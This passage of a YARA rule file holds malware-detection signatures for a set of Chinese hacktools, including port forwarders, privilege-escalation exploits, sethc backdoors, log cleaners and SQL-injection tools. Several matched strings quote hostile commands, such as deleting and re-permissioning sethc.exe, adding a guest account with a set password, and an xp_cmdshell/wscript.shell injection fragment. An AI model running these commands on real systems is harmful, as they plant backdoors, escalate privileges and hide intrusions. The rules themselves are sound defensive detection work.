uint16(0) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule ChineseHacktools_Htran_V2_40_htran20\n{\n    meta:\n        description = \"Chinese hacktool (file: htran20.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Htran_V2_40_htran20\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"%s -slave  ConnectHost ConnectPort TransmitHost TransmitPort\" fullword ascii\n        $s2 = \"Enter Your Socks Type No: [0.BindPort 1.ConnectBack 2.Listen]:\" fullword ascii\n        $s3 = \"[SERVER]connection to %s:%d error\" fullword ascii\n        $s4 = \"%s -connect ConnectHost [ConnectPort]       Default:%d\" fullword ascii\n        $s5 = \"[+] got, ip:%s, port:%d\" fullword ascii\n        $s6 = \"[-] There is a error...Create a new connection.\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule ChineseHacktools_DictionaryGenerator\n{\n    meta:\n        description = \"Chinese hacktool (file: DictionaryGenerator.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_DictionaryGenerator\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"`PasswordBuilder\" fullword ascii\n        $s2 = \"cracker\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 3650KB and all of them\n}\n\nrule ChineseHacktools_ms11080_withcmd_\n{\n    meta:\n        description = \"Chinese hacktool (file: ms11080_withcmd.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_ms11080_withcmd\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Usage : ms11-080.exe cmd.exe Command \" fullword ascii\n        $s3 = \"[>] create pipe error\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 340KB and all of them\n}\n\nrule ChineseHacktools_T00ls_Lpk_Sethc_v2\n{\n    meta:\n        description = \"Chinese hacktool (file: T00ls Lpk Sethc v2.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_T00ls_Lpk_Sethc_v2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"LOADER ERROR\" fullword ascii\n        $s2 = \"The procedure entry point %s could not be located in the dynamic link library %s\" fullword ascii\n        $s3 = \"2011-2012 T00LS&RICES\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 800KB and all of them\n}\n\nrule ChineseHacktools_HASH_32\n{\n    meta:\n        description = \"Chinese hacktool (file: 32.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_HASH_32\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s5 = \"[Undefined OS version]  Major: %d Minor: %d\" fullword ascii\n        $s8 = \"Try To Run As Administrator ...\" fullword ascii\n        $s9 = \"Specific LUID NOT found\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 240KB and all of them\n}\n\nrule ChineseHacktools_windows_mstsc_enhanced_RMDSTC\n{\n    meta:\n        description = \"Chinese hacktool (file: RMDSTC.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_windows_mstsc_enhanced_RMDSTC\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"zava zir5@163.com\" fullword wide\n        $s1 = \"By newccc\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 400KB and all of them\n}\n\nrule ChineseHacktools_sig_3389_mstsc_MSTSCAX\n{\n    meta:\n        description = \"Chinese hacktool (file: MSTSCAX.DLL)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_sig_3389_mstsc_MSTSCAX\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"ResetPasswordWWWx\" fullword ascii\n        $s2 = \"Terminal Server Redirected Printer Doc\" fullword wide\n        $s3 = \"Cleaning temp directory\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule ChineseHacktools_T00ls_scanner\n{\n    meta:\n        description = \"Chinese hacktool (file: T00ls_scanner.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_T00ls_scanner\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"http://cn.bing.com/search?first=1&count=50&q=ip:\" fullword wide\n        $s17 = \"Team:www.t00ls.net\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 330KB and all of them\n}\n\nrule ChineseHacktools_GetHashes\n{\n    meta:\n        description = \"Chinese hacktool (file: GetHashes.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_GetHashes\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"SAM\\\\Domains\\\\Account\\\\Users\\\\Names registry hive reading error!\" fullword ascii\n        $s1 = \"GetHashes <SAM registry file> [System key file]\" fullword ascii\n        $s2 = \"Note: Windows registry file shall begin from 'regf' signature!\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 87KB and 2 of them\n}\n\nrule ChineseHacktools_hashq_Hashq\n{\n    meta:\n        description = \"Chinese hacktool (file: Hashq.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_hashq_Hashq\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Hashq.exe\" fullword wide\n        $s5 = \"CnCert.Net\" fullword wide\n        $s6 = \"Md5 query tool\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 600KB and all of them\n}\n\nrule ChineseHacktools_ShiftBackdoor_Server\n{\n    meta:\n        description = \"Chinese hacktool (file: Server.dat)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_ShiftBackdoor_Server\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"del /q /f %systemroot%system32sethc.exe\" fullword ascii\n        $s1 = \"cacls %s /t /c /e /r administrators\" fullword ascii\n        $s2 = \"\\\\dllcache\\\\sethc.exe\" fullword ascii\n        $s3 = \"\\\\ntvdm.exe\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and 2 of them\n}\n\nrule ChineseHacktools_exp_win2003\n{\n    meta:\n        description = \"Chinese hacktool (file: win2003.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_exp_win2003\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Usage:system_exp.exe \\\"cmd\\\"\" fullword ascii\n        $s2 = \"The shell \\\"cmd\\\" success!\" fullword ascii\n        $s4 = \"Not Windows NT family OS.\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule ChineseHacktools_Interception3389_setup\n{\n    meta:\n        description = \"Chinese hacktool (file: setup.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Interception3389_setup\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Notify\\\\%s\" fullword ascii\n        $s1 = \"%s\\\\temp\\\\temp%d.bat\" fullword ascii\n        $s5 = \"EventStartShell\" fullword ascii\n        $s6 = \"del /f /q \\\"%s\\\"\" fullword ascii\n        $s7 = \"\\\\wminotify.dll\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 400KB and all of them\n}\n\nrule ChineseHacktools_CnCerT_CCdoor_CMD_2\n{\n    meta:\n        description = \"Chinese hacktool (file: CnCerT.CCdoor.CMD.dll2)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_CnCerT_CCdoor_CMD_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"cmd.dll\" fullword wide\n        $s1 = \"cmdpath\" fullword ascii\n        $s2 = \"Get4Bytes\" fullword ascii\n        $s3 = \"ExcuteCmd\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 22KB and all of them\n}\n\nrule ChineseHacktools_exp_ms11046\n{\n    meta:\n        description = \"Chinese hacktool (file: ms11046.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_exp_ms11046\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"[*] Token system command\" fullword ascii\n        $s1 = \"[*] command add user 90sec 90sec\" fullword ascii\n        $s2 = \"[*] Add to Administrators success\" fullword ascii\n        $s3 = \"Program: %s%s%s%s%s%s%s%s%s%s%s\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule ChineseHacktools_Master_beta_1_7\n{\n    meta:\n        description = \"Chinese hacktool (file: Master_beta_1.7.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Master_beta_1_7\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"http://seo.chinaz.com/?host=\" fullword ascii\n        $s2 = \"Location: getpass.asp?info=\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 312KB and all of them\n}\n\nrule ChineseHacktools_F4ck_Team_f4ck_2\n{\n    meta:\n        description = \"Chinese hacktool (file: f4ck_2.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_F4ck_Team_f4ck_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"F4ck.exe\" fullword wide\n        $s2 = \"@Netapi32.dll\" fullword ascii\n        $s3 = \"Team.F4ck.Net\" fullword wide\n        $s8 = \"Administrators\" fullword ascii\n        $s9 = \"F4ck Team\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 220KB and 2 of them\n}\n\nrule ChineseHacktools_sig_3389_80_AntiFW\n{\n    meta:\n        description = \"Chinese hacktool (file: AntiFW.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_sig_3389_80_AntiFW\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Set TS to port:80 Successfully!\" fullword ascii\n        $s2 = \"Now,set TS to port 80\" fullword ascii\n        $s3 = \"echo. >>amethyst.reg\" fullword ascii\n        $s4 = \"del amethyst.reg\" fullword ascii\n        $s5 = \"AntiFW.cpp\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 30KB and 2 of them\n}\n\nrule ChineseHacktools_wwwscan_gui\n{\n    meta:\n        description = \"Chinese hacktool (file: wwwscan_gui.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_wwwscan_gui\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"%s www.target.com -p 8080 -m 10 -t 16\" fullword ascii\n        $s2 = \"/eye2007Admin_login.aspx\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 280KB and all of them\n}\n\nrule ChineseHacktools_SwordCollEdition\n{\n    meta:\n        description = \"Chinese hacktool (file: SwordCollEdition.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_SwordCollEdition\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"YuJianScan.exe\" fullword wide\n        $s1 = \"YuJianScan\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 225KB and all of them\n}\n\nrule ChineseHacktools_HconSTFportable\n{\n    meta:\n        description = \"Chinese hacktool (file: HconSTFportable.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_HconSTFportable\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"HconSTFportable.exe\" fullword wide\n        $s2 = \"www.Hcon.in\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 354KB and all of them\n}\n\nrule ChineseHacktools_T00ls_Lpk_Sethc_v3_LPK\n{\n    meta:\n        description = \"Chinese hacktool (file: LPK.DAT)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_T00ls_Lpk_Sethc_v3_LPK\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"FreeHostKillexe.exe\" fullword ascii\n        $s2 = \"\\\\sethc.exe /G everyone:F\" fullword ascii\n        $s3 = \"c:\\\\1.exe\" fullword ascii\n        $s4 = \"Set user Group Error! Username:\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 400KB and all of them\n}\n\nrule ChineseHacktools_Without_a_trace_Wywz\n{\n    meta:\n        description = \"Chinese hacktool (file: Wywz.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Without_a_trace_Wywz\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"\\\\Symantec\\\\Norton Personal Firewall\\\\Log\\\\Content.log\" fullword ascii\n        $s2 = \"UpdateFile=d:\\\\tool\\\\config.ini,Option\\\\\\\\proxyIp=127.0.0.1\\\\r\\\\nproxyPort=808\" ascii\n        $s3 = \"%s\\\\subinacl.exe /subkeyreg \\\"%s\\\" /Grant=%s=f /Grant=everyone=f\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1800KB and all of them\n}\n\nrule ChineseHacktools_LPK2_0_LPK\n{\n    meta:\n        description = \"Chinese hacktool (file: LPK.DAT)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_LPK2_0_LPK\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"\\\\sethc.exe /G everyone:F\" fullword ascii\n        $s2 = \"net1 user guest guest123!@#\" fullword ascii\n        $s3 = \"\\\\dllcache\\\\sethc.exe\" fullword ascii\n        $s4 = \"sathc.exe 211\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1030KB and all of them\n}\n\nrule ChineseHacktools_cleaniis\n{\n    meta:\n        description = \"Chinese hacktool (file: cleaniis.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_cleaniis\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"iisantidote <logfile dir> <ip or string to hide>\" fullword ascii\n        $s4 = \"IIS log file cleaner by Scurt\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule ChineseHacktools_arp3_7_arp3_7\n{\n    meta:\n        description = \"Chinese hacktool (file: arp3.7.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_arp3_7_arp3_7\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"CnCerT.Net.SKiller.exe\" fullword wide\n        $s2 = \"www.80sec.com\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 4000KB and all of them\n}\n\nrule ChineseHacktools_exp_ms11080\n{\n    meta:\n        description = \"Chinese hacktool (file: ms11080.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_exp_ms11080\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s2 = \"[*] command add user 90sec 90sec\" fullword ascii\n        $s6 = \"[*] Add to Administrators success\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 840KB and all of them\n}\n\nrule ChineseHacktools_Injection_transit\n{\n    meta:\n        description = \"Chinese hacktool (file: Injection_transit.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Injection_transit\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"<description>Your app description here</description> \" fullword ascii\n        $s4 = \"Copyright (C) 2003 ZYDSoft Corp.\" fullword wide\n        $s5 = \"ScriptnackgBun\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 3175KB and all of them\n}\n\nrule ChineseHacktools_Safe3WVS\n{\n    meta:\n        description = \"Chinese hacktool (file: Safe3WVS.EXE)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Safe3WVS\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"2TerminateProcess\" fullword ascii\n        $s1 = \"mscoreei.dll\" fullword ascii\n        $s7 = \"SafeVS.exe\" fullword wide\n        $s8 = \"www.safe3.com.cn\" fullword wide\n        $s20 = \"SOFTWARE\\\\Classes\\\\Interface\\\\\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 3000KB and all of them\n}\n\nrule ChineseHacktools_NBSI_3_0\n{\n    meta:\n        description = \"Chinese hacktool (file: NBSI 3.0.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_NBSI_3_0\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \";use master declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oamet\" wide\n        $s2 = \"http://localhost/1.asp?id=16\" fullword ascii\n        $s3 = \" exec master.dbo.xp_cmdshell @Z--\" fullword wide\n        $s4 = \";use master declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oamet\" wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2600KB and 2 of them\n}\n\nrule ChineseHacktools_sig_3389_DUBrute_v3_0_RC3_2_0\n{\n    meta:\n        description = \"Chinese hacktool (file: 2.0.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_sig_3389_DUBrute_v3_0_RC3_2_0\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"IP - %d; Login - %d; Password - %d; Combination - %d\" fullword ascii\n        $s3 = \"Create %d IP@Loginl;Password\" fullword ascii\n        $s15 = \"UBrute.com\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 980KB and 2 of them\n}\n\nrule ChineseHacktools_hkmjjiis6_\n{\n    meta:\n        description = \"Chinese hacktool (file: hkmjjiis6.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_hkmjjiis6\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s14 = \"* FROM IIsWebInfo/r\" fullword ascii\n        $s19 = \"ltithread4ck/\" fullword ascii\n        $s20 = \"LookupAcc=Sid#\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 175KB and all of them\n}\n\nrule ChineseHacktools_clearlogs\n{\n    meta:\n        description = \"Chinese hacktool (file: clearlogs.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_clearlogs\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s2 = \"- http://ntsecurity.nu/toolbox/clearlogs/\" fullword ascii\n        $s4 = \"Error: Unable to clear log - \" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 140KB and all of them\n}\n\nrule ChineseHacktools_no_net_priv_esc_AddUser\n{\n    meta:\n        description = \"Chinese hacktool (file: AddUser.dll)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_no_net_priv_esc_AddUser\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"PECompact2\" fullword ascii\n        $s1 = \"adduser\" fullword ascii\n        $s5 = \"OagaBoxA\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 115KB and all of them\n}\n\nrule ChineseHacktools_Injection\n{\n    meta:\n        description = \"Chinese hacktool (file: Injection.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Injection\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"http://127.0.0.1/6kbbs/bank.asp\" fullword ascii\n        $s7 = \"jmPost.asp\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 220KB and all of them\n}\n\nrule ChineseHacktools_SQLServer_inject_Creaked\n{\n    meta:\n        description = \"Chinese hacktool (file: SQLServer_inject_Creaked.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_SQLServer_inject_Creaked\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"http://localhost/index.asp?id=2\" fullword ascii\n        $s2 = \"Email:zhaoxypass@yahoo.com.cn<br>\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 8110KB and all of them\n}\n\nrule 